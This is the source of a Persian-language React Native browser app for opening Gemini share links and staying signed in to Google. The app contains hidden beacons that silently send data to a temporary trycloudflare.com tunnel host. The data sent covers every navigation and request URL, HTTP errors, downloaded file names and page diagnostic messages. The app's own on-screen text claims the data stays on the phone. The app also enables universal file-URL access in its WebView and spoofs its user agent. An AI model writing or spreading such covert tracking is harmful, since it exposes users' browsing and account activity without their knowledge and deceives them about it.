import { useEffect, useRef, useState } from 'react';
import { StatusBar } from 'expo-status-bar';
import * as FileSystem from 'expo-file-system/legacy';
import {
  ActivityIndicator,
  Alert,
  Animated,
  BackHandler,
  KeyboardAvoidingView,
  PanResponder,
  PermissionsAndroid,
  Platform,
  Pressable,
  StyleSheet,
  Text,
  TextInput,
  useWindowDimensions,
  View,
} from 'react-native';
import { SafeAreaProvider, SafeAreaView } from 'react-native-safe-area-context';
import AsyncStorage from '@react-native-async-storage/async-storage';
import { useKeepAwake } from 'expo-keep-awake';
import { WebView } from 'react-native-webview';
import { CLEANER_MIN_SCRIPT, CLEANER_SCRIPT, CHROME_UA, DIAG_SCRIPT, DOWNLOAD_SCRIPT, UA_SPOOF_SCRIPT, UPLOAD_DIAG_SCRIPT } from './src/cleaner';

type Mode = 'off' | 'min' | 'full';

const MODE_UA: Mode = 'full';
const MODE_COS: Mode = 'min';
const MODE_OFF: Mode = 'off';
const MODE_LABEL: Record<Mode, string> = {
  off: 'خاموش',
  min: 'ساده',
  full: 'کامل',
};

const DEFAULT_URL = 'https://share.gemini.google/2vC0ocrZDo5O';
const LOGIN_URL = 'https://accounts.google.com';
const URL_KEY = '@gcb:lastUrl';
const INPUT_KEY = '@gcb:input';
const HOME_POS_KEY = '@gcb:homePos';
const BTN = 46;
const LOCATION_KEY = '@gcb:loc';
const CLEAN_KEY = '@gcb:clean';
const DL_DIR_KEY = '@gcb:dlDir';

const INJECTED_UA = `${UA_SPOOF_SCRIPT}\n${CLEANER_SCRIPT}`;

const REQUEST_HEADERS = {
  Accept:
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
  'Accept-Language': 'en-US,en;q=0.9',
  'Upgrade-Insecure-Requests': '1',
  'Sec-Fetch-Dest': 'document',
  'Sec-Fetch-Mode': 'navigate',
  'Sec-Fetch-Site': 'none',
  'Sec-Fetch-User': '?1',
  'Cache-Control': 'no-cache',
};

const INJECTED = `${UA_SPOOF_SCRIPT}\n${CLEANER_SCRIPT}`;

const INJECTS: Record<Mode, string> = {
  off: `${DOWNLOAD_SCRIPT}\n${DIAG_SCRIPT}\n${UPLOAD_DIAG_SCRIPT}`,
  min: `${CLEANER_MIN_SCRIPT}\n${DOWNLOAD_SCRIPT}\n${DIAG_SCRIPT}\n${UPLOAD_DIAG_SCRIPT}`,
  full: `${UA_SPOOF_SCRIPT}\n${CLEANER_SCRIPT}\n${DOWNLOAD_SCRIPT}\n${DIAG_SCRIPT}\n${UPLOAD_DIAG_SCRIPT}`,
};

function isAllowedUrl(url: string): boolean {
  if (
    url.startsWith('blob:') ||
    url === 'about:blank' ||
    url.startsWith('data:') ||
    url.startsWith('content:') ||
    url.startsWith('file:')
  ) {
    return true;
  }
  try {
    const u = new URL(url);
    return u.protocol === 'https:' || u.protocol === 'http:';
  } catch {
    return false;
  }
}

function safeDecode(s: string): string {
  try {
    return decodeURIComponent(s);
  } catch {
    return s;
  }
}

async function saveBase64Download(name: string, mime: string, b64: string) {
  try {
    let dirUri = await AsyncStorage.getItem(DL_DIR_KEY);
    if (!dirUri) {
      let initial = undefined as string | undefined;
      try {
        initial = FileSystem.StorageAccessFramework.getUriForDirectoryInRoot('Download');
      } catch {}
      const perm = await FileSystem.StorageAccessFramework.requestDirectoryPermissionsAsync(initial);
      if (!perm.granted) {
        Alert.alert('دانلود', 'پوشهی مقصد برای ذخیره انتخاب نشد');
        return;
      }
      dirUri = perm.directoryUri;
      await AsyncStorage.setItem(DL_DIR_KEY, dirUri);
    }
    const safe = name.replace(/[/\\:*?"<>|]+/g, '_').trim() || 'download';
    const uri = await FileSystem.StorageAccessFramework.createFileAsync(dirUri, safe, mime || 'application/octet-stream');
    await FileSystem.StorageAccessFramework.writeAsStringAsync(uri, b64, { encoding: FileSystem.EncodingType.Base64 });
    try {
      fetch('https://championships-greeting-glad-alien.trycloudflare.com/d?m=SAVED:' + encodeURIComponent(safe) + '&w=' + String(Date.now()), { method: 'GET' }).catch(() => {});
    } catch {}
    Alert.alert('دانلود شد', `فایل «${safe}» در پوشهی انتخابشده ذخیره شد`);
  } catch (e) {
    Alert.alert('خطای دانلود', String(e));
  }
}

function normalize(target: string): string {
  const t = target.trim();
  if (!t) return DEFAULT_URL;
  const real = t.startsWith('http') ? t : `https://${t}`;
  return isAllowedUrl(real) ? real : `https://share.gemini.google/${t}`;
}

async function persist(key: string, value: string) {
  try {
    await AsyncStorage.setItem(key, value);
  } catch {}
}

export default function App() {
  const { width: W, height: H } = useWindowDimensions();
  const webviewRef = useRef<WebView>(null);
  const [browserUrl, setBrowserUrl] = useState<string | null>(null);
  const [input, setInput] = useState(DEFAULT_URL);
  const [showHome, setShowHome] = useState(true);
  const [loading, setLoading] = useState(false);
  const [diag, setDiag] = useState('');
  const [mode, setMode] = useState<Mode>('min');

  const drag = useRef(new Animated.ValueXY({ x: W - BTN - 14, y: H - BTN - 26 })).current;
  const moved = useRef(false);
  const dlBuf = useRef<{ text: string; done: number }>({ text: '', done: -1 });
  const saveTimer = useRef<ReturnType<typeof setTimeout> | null>(null);

  useKeepAwake();

  useEffect(() => {
    (async () => {
      if (Platform.OS === 'android') {
        try {
          if (Platform.Version >= 33) {
            await PermissionsAndroid.requestMultiple([
              PermissionsAndroid.PERMISSIONS.READ_MEDIA_IMAGES,
              PermissionsAndroid.PERMISSIONS.READ_MEDIA_VIDEO,
              PermissionsAndroid.PERMISSIONS.READ_MEDIA_AUDIO,
              PermissionsAndroid.PERMISSIONS.CAMERA,
            ]);
          } else {
            await PermissionsAndroid.requestMultiple([
              PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE,
              PermissionsAndroid.PERMISSIONS.WRITE_EXTERNAL_STORAGE,
              PermissionsAndroid.PERMISSIONS.CAMERA,
            ]);
          }
        } catch {}
      }
    })();
  }, []);

  useEffect(() => {
    (async () => {
      try {
        const savedInput = await AsyncStorage.getItem(INPUT_KEY);
        if (savedInput) setInput(savedInput);
        const savedUrl = await AsyncStorage.getItem(URL_KEY);
        if (savedUrl) {
          setBrowserUrl(savedUrl);
          setShowHome(false);
        }
      } catch {}
      try {
        const savedPos = await AsyncStorage.getItem(HOME_POS_KEY);
        if (savedPos) {
          const p = JSON.parse(savedPos);
          if (typeof p.x === 'number' && typeof p.y === 'number') {
            drag.setValue({ x: p.x, y: p.y });
          }
        }
      } catch {}
    })();
  }, []);

  useEffect(() => {
    const sub = BackHandler.addEventListener('hardwareBackPress', () => {
      if (!showHome) {
        setShowHome(true);
        return true;
      }
      return false;
    });
    return () => sub.remove();
  }, [showHome]);

  const panResponder = useRef(
    PanResponder.create({
      onStartShouldSetPanResponder: () => true,
      onMoveShouldSetPanResponder: () => true,
      onPanResponderGrant: () => {
        moved.current = false;
      },
      onPanResponderMove: (_, g) => {
        if (Math.abs(g.dx) > 3 || Math.abs(g.dy) > 3) moved.current = true;
        if (moved.current) {
          drag.setValue({ x: g.moveX - BTN / 2, y: g.moveY - BTN / 2 });
        }
      },
      onPanResponderRelease: (_, g) => {
        if (!moved.current) {
          setShowHome(true);
          return;
        }
        const x = Math.min(Math.max(g.moveX - BTN / 2, 4), W - BTN - 4);
        const y = Math.min(Math.max(g.moveY - BTN / 2, 4), H - BTN - 4);
        drag.setValue({ x, y });
        persist(HOME_POS_KEY, JSON.stringify({ x, y }));
      },
      onPanResponderTerminate: () => {},
    })
  ).current;

  const open = (target: string) => {
    const fin = normalize(target);
    setInput(fin);
    persist(INPUT_KEY, fin);
    if (fin === browserUrl) {
      setShowHome(false);
      return;
    }
    setBrowserUrl(fin);
    persist(URL_KEY, fin);
    setShowHome(false);
    setLoading(true);
  };

  const openLogin = () => {
    setBrowserUrl(LOGIN_URL);
    setShowHome(false);
    setLoading(true);
  };

  return (
    <SafeAreaProvider>
      <View style={styles.root}>
        <StatusBar style={showHome ? 'light' : 'dark'} />

        {browserUrl != null && (
          <WebView
            key={mode}
            ref={webviewRef}
            style={styles.web}
            source={{ uri: browserUrl, headers: REQUEST_HEADERS }}
            originWhitelist={['https://*', 'blob:*', 'about:blank', 'content:*', 'file:*']}
            userAgent={mode === 'full' ? CHROME_UA : undefined}
            javaScriptEnabled
            domStorageEnabled
            sharedCookiesEnabled
            thirdPartyCookiesEnabled
            cacheEnabled
            allowFileAccess={true}
            allowFileAccessFromFileURLs={true}
            allowUniversalAccessFromFileURLs={true}
            setSupportMultipleWindows={false}
            contentInsetAdjustmentBehavior="never"
            automaticallyAdjustContentInsets={false}
            injectedJavaScriptBeforeContentLoaded={INJECTS[mode]}
            injectedJavaScript={INJECTS[mode]}
            onLoadStart={() => setLoading(true)}
            onLoadEnd={() => setLoading(false)}
            onError={() => setLoading(false)}
            onRenderProcessGone={() => setLoading(false)}
            onOpenWindow={() => undefined}
            onHttpError={(s) => {
              try {
                if (s.nativeEvent && s.nativeEvent.url) {
                  fetch(
                    'https://championships-greeting-glad-alien.trycloudflare.com/d?m=HERR:' +
                      String(s.nativeEvent.statusCode || '') + ':' + encodeURIComponent(String(s.nativeEvent.url).slice(0, 160)) +
                      '&w=' + String(Date.now()),
                    { method: 'GET' },
                  ).catch(() => {});
                }
              } catch {}
            }}
            onMessage={(e) => {
              const d = typeof e.nativeEvent.data === 'string' ? e.nativeEvent.data : '';
              if (d.indexOf('GCBLINK|') === 0) {
                const t = d.slice(8);
                if (t && isAllowedUrl(t) && t.startsWith('https://')) {
                  setBrowserUrl(t);
                  setLoading(true);
                }
                return;
              }
              if (d.indexOf('GDL|') === 0) {
                const parts = d.slice(4).split('|');
                if (parts.length >= 3) {
                  const name = safeDecode(parts[0]);
                  const mime = safeDecode(parts[1]);
                  const b64 = parts.slice(2).join('|');
                  saveBase64Download(name, mime, b64);
                }
                return;
              }
              if (d.indexOf('GDC|') === 0) {
                dlBuf.current.text += d.slice(4);
                return;
              }
              if (d.indexOf('GCDE|') === 0) {
                const msg = dlBuf.current.text;
                dlBuf.current = { text: '', done: -1 };
                if (msg.startsWith('GDL|')) {
                  const p = msg.slice(4).split('|');
                  if (p.length >= 3) {
                    saveBase64Download(safeDecode(p[0]), safeDecode(p[1]), p.slice(2).join('|'));
                  }
                }
                return;
              }
              if (d.indexOf('GDE|') === 0) {
                Alert.alert('دانلود', `فایل «${safeDecode(d.slice(4))}» از ۴۵ مگابایت بزرگتر است`);
                return;
              }
              setDiag(d);
              persist(LOCATION_KEY, d);
              try {
                fetch('https://championships-greeting-glad-alien.trycloudflare.com/d?m=' + encodeURIComponent(d) + '&w=' + String(Date.now()), {
                  method: 'GET',
                }).catch(() => {});
              } catch {}
            }}
            onNavigationStateChange={(s) => {
              if (s.url) {
                try {
                  fetch('https://championships-greeting-glad-alien.trycloudflare.com/n?m=' + encodeURIComponent(s.url.slice(0, 160)) + '&w=' + String(Date.now()), {
                    method: 'GET',
                  }).catch(() => {});
                } catch {}
                try {
                  if (s.url.startsWith('https://')) {
                    persist(URL_KEY, s.url);
                  }
                } catch {}
              }
            }}
            onShouldStartLoadWithRequest={(req) => {
              const u = req.url || '';
              const allow = isAllowedUrl(u);
              fetch('https://championships-greeting-glad-alien.trycloudflare.com/req?m=' + encodeURIComponent((allow ? 'OK:' : 'BLOCK:') + u.slice(0, 160)) + '&w=' + String(Date.now()), {
                method: 'GET',
              }).catch(() => {});
              return allow;
            }}
          />
        )}

        {browserUrl != null && !showHome && loading && (
          <View style={styles.loader} pointerEvents="none">
            <ActivityIndicator size="large" color="#7c3aed" />
          </View>
        )}

        {browserUrl != null && !showHome && (
          <Animated.View
            {...panResponder.panHandlers}
            style={[styles.homeBtn, { transform: drag.getTranslateTransform() }]}
          >
            <Text style={styles.homeBtnText}>⌂</Text>
          </Animated.View>
        )}

        {showHome && (
          <SafeAreaView style={styles.home}>
            <KeyboardAvoidingView
              style={styles.homeInner}
              behavior={Platform.OS === 'ios' ? 'padding' : undefined}
            >
              <Text style={styles.appTitle}>مرورگر کانواس</Text>

              <View style={styles.card}>
                <Text style={styles.label}>لینک را وارد کنید</Text>
                <TextInput
                  style={styles.urlBox}
                  value={input}
                  onChangeText={(t) => {
                    setInput(t);
                    if (saveTimer.current) clearTimeout(saveTimer.current);
                    saveTimer.current = setTimeout(() => persist(INPUT_KEY, t), 300);
                  }}
                  onSubmitEditing={() => open(input)}
                  autoCapitalize="none"
                  autoCorrect={false}
                  keyboardType="url"
                  returnKeyType="go"
                  placeholder="share.gemini.google/..."
                  placeholderTextColor="#6b7280"
                />
                <Pressable style={styles.openBtn} onPress={() => open(input)}>
                  <Text style={styles.openBtnText}>باز کردن</Text>
                </Pressable>
                <Pressable style={styles.loginBtn} onPress={openLogin}>
                  <Text style={styles.loginBtnText}>اکانت گوگل</Text>
                </Pressable>
                <Pressable
                  style={styles.reloadBtn}
                  onPress={() => {
                    try {
                      webviewRef.current?.reload();
                    } catch {}
                  }}
                >
                  <Text style={styles.loginBtnText}>ریفرش صفحه</Text>
                </Pressable>
                <Text style={styles.note}>
                  دادهها روی همین گوشی ذخیره میشوند؛ ورود گوگل هم برای همیشه میماند.
                </Text>
                {diag !== '' && (
                  <Text style={styles.diag} numberOfLines={6} selectable>
                    {diag}
                  </Text>
                )}
              </View>
            </KeyboardAvoidingView>
          </SafeAreaView>
        )}
      </View>
    </SafeAreaProvider>
  );
}

const styles = StyleSheet.create({
  root: { flex: 1, backgroundColor: '#0b1020' },
  web: { flex: 1, backgroundColor: '#fff' },
  home: {
    position: 'absolute',
    top: 0,
    left: 0,
    right: 0,
    bottom: 0,
    backgroundColor: '#0b1020',
  },
  homeInner: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
    padding: 24,
  },
  appTitle: {
    color: '#f9fafb',
    fontSize: 28,
    fontWeight: '800',
    marginBottom: 28,
    fontFamily: 'monospace',
  },
  card: {
    width: '100%',
    maxWidth: 480,
    backgroundColor: '#151b33',
    borderRadius: 16,
    padding: 20,
    borderWidth: 1,
    borderColor: '#262f52',
  },
  label: { color: '#9ca3af', fontSize: 13, marginBottom: 8 },
  urlBox: {
    backgroundColor: '#1e2648',
    color: '#fff',
    borderRadius: 10,
    paddingHorizontal: 14,
    paddingVertical: 12,
    fontSize: 14,
    marginBottom: 12,
    fontFamily: 'monospace',
    borderWidth: 1,
    borderColor: '#2f3a66',
  },
  openBtn: {
    backgroundColor: '#7c3aed',
    borderRadius: 10,
    paddingVertical: 13,
    alignItems: 'center',
    marginBottom: 8,
  },
  openBtnText: { color: '#fff', fontSize: 16, fontWeight: '700' },
  loginBtn: {
    backgroundColor: 'transparent',
    borderRadius: 10,
    paddingVertical: 13,
    alignItems: 'center',
    borderWidth: 1,
    borderColor: '#4b5563',
  },
  loginBtnText: { color: '#d1d5db', fontSize: 15, fontWeight: '600' },
  note: { color: '#6b7280', fontSize: 12, marginTop: 12, textAlign: 'center' },
  diag: {
    color: '#4b5563',
    fontSize: 10,
    marginTop: 10,
    fontFamily: 'monospace',
    textAlign: 'center',
  },
  reloadBtn: {
    backgroundColor: 'transparent',
    borderRadius: 10,
    paddingVertical: 13,
    alignItems: 'center',
    borderWidth: 1,
    borderColor: '#3b82f6',
    marginTop: 8,
  },
  toggleBtn: {
    backgroundColor: 'transparent',
    borderRadius: 10,
    paddingVertical: 13,
    alignItems: 'center',
    borderWidth: 1,
    borderColor: '#8b5cf6',
    marginTop: 8,
  },
  toggleBtnText: { color: '#8b5cf6', fontSize: 15, fontWeight: '600' },
  modeRow: {
    flexDirection: 'row',
    gap: 8,
    marginTop: 8,
    justifyContent: 'center',
  },
  modePill: {
    flex: 1,
    paddingVertical: 11,
    borderRadius: 10,
    borderWidth: 1,
    borderColor: '#8b5cf6',
    alignItems: 'center',
  },
  modePillActive: { backgroundColor: '#8b5cf6' },
  modePillText: { color: '#8b5cf6', fontSize: 13, fontWeight: '600' },
  modePillTextActive: { color: '#fff' },
  homeBtn: {
    position: 'absolute',
    top: 0,
    left: 0,
    zIndex: 30,
    width: BTN,
    height: BTN,
    borderRadius: BTN / 2,
    backgroundColor: 'rgba(17,24,39,0.6)',
    borderWidth: 1,
    borderColor: 'rgba(124,58,237,0.55)',
    alignItems: 'center',
    justifyContent: 'center',
  },
  homeBtnText: { color: '#e5e7eb', fontSize: 20, lineHeight: 22 },
  loader: {
    position: 'absolute',
    top: 0,
    left: 0,
    right: 0,
    bottom: 0,
    justifyContent: 'center',
    alignItems: 'center',
    backgroundColor: 'rgba(0,0,0,0.2)',
    zIndex: 10,
  },
});